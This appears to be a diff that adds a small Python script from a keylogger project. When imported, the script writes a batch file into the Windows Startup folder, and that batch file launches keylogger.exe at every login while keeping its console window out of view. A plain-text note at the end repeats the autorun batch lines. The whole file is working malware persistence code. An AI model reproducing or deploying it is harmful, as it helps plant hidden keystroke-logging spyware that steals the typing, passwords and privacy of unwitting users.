@@ -1,0 +1,29 @@
+# only for system windows
+import os
+import os.path
+
+USER_PROFILE = (os.environ['USERPROFILE'])
+
+def add_to_startup(file_path='C:/keylogger/dist/keylogger.exe'):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_PROFILE
+    with open(bat_path + '\\' + "open.bat", "w") as bat_file:
+        bat_file.write(r'@echo off'+ os.linesep)   ## to hide console batch file when it run
+        bat_file.write(r'start "" %s' % file_path)
+
+
+add_to_startup()
+
+
+
+
+
+###################
+
+save .bat in autorun like this :
+
+@echo off
+start "" C:/keylogger/dist/keylogger.exe
+
+##################
